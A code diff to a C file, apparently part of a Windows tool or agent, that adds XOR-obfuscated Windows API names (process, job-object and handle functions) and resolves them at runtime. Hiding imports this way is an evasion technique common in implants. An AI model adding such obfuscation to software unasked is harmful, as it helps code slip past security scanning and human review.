@@ -256,6 +256,14 @@ void c2t_win32_api_init(void) {
   static const unsigned char enc_CreatePipe[] = {25, 40, 63, 59, 46, 63, 10, 51, 42, 63};
   static const unsigned char enc_PeekNamedPipe[] = {10, 63, 63, 49, 4, 59, 55, 63, 62, 10, 51, 42, 63};
   static const unsigned char enc_SetHandleInformation[] = {9, 63, 46, 18, 59, 52, 62, 54, 63, 19, 52, 60, 53, 40, 55, 59, 46, 51, 53, 52};
+  static const unsigned char enc_GetEnvironmentVariableA[] = {29, 63, 46, 31, 52, 44, 51, 40, 53, 52, 55, 63, 52, 46, 12, 59, 40, 51, 59, 56, 54, 63, 27};
+  static const unsigned char enc_GetSystemDirectoryA[] = {29, 63, 46, 9, 35, 41, 46, 63, 55, 30, 51, 40, 63, 57, 46, 53, 40, 35, 27};
+  static const unsigned char enc_CreateJobObjectA[] = {25, 40, 63, 59, 46, 63, 16, 53, 56, 21, 56, 48, 63, 57, 46, 27};
+  static const unsigned char enc_SetInformationJobObject[] = {9, 63, 46, 19, 52, 60, 53, 40, 55, 59, 46, 51, 53, 52, 16, 53, 56, 21, 56, 48, 63, 57, 46};
+  static const unsigned char enc_AssignProcessToJobObject[] = {27, 41, 41, 51, 61, 52, 10, 40, 53, 57, 63, 41, 41, 14, 53, 16, 53, 56, 21, 56, 48, 63, 57, 46};
+  static const unsigned char enc_TerminateJobObject[] = {14, 63, 40, 55, 51, 52, 59, 46, 63, 16, 53, 56, 21, 56, 48, 63, 57, 46};
+  static const unsigned char enc_ResumeThread[] = {8, 63, 41, 47, 55, 63, 14, 50, 40, 63, 59, 62};
+  static const unsigned char enc_DuplicateHandle[] = {30, 47, 42, 54, 51, 57, 59, 46, 63, 18, 59, 52, 62, 54, 63};
 
   /* ntdll functions */
   static const unsigned char enc_ntdll_dll[] = {52, 46, 62, 54, 54, 116, 62, 54, 54};
@@ -500,6 +508,14 @@ void c2t_win32_api_init(void) {
   LOAD_API(hKernel32, CreatePipe, enc_CreatePipe);
   LOAD_API(hKernel32, PeekNamedPipe, enc_PeekNamedPipe);
   LOAD_API(hKernel32, SetHandleInformation, enc_SetHandleInformation);
+  LOAD_API(hKernel32, GetEnvironmentVariableA, enc_GetEnvironmentVariableA);
+  LOAD_API(hKernel32, GetSystemDirectoryA, enc_GetSystemDirectoryA);
+  LOAD_API(hKernel32, CreateJobObjectA, enc_CreateJobObjectA);
+  LOAD_API(hKernel32, SetInformationJobObject, enc_SetInformationJobObject);
+  LOAD_API(hKernel32, AssignProcessToJobObject, enc_AssignProcessToJobObject);
+  LOAD_API(hKernel32, TerminateJobObject, enc_TerminateJobObject);
+  LOAD_API(hKernel32, ResumeThread, enc_ResumeThread);
+  LOAD_API(hKernel32, DuplicateHandle, enc_DuplicateHandle);
   LOAD_API(hKernel32, SetDefaultDllDirectories, enc_SetDefaultDllDirectories);
 
   if (g_c2t_win32.SetDefaultDllDirectories) {
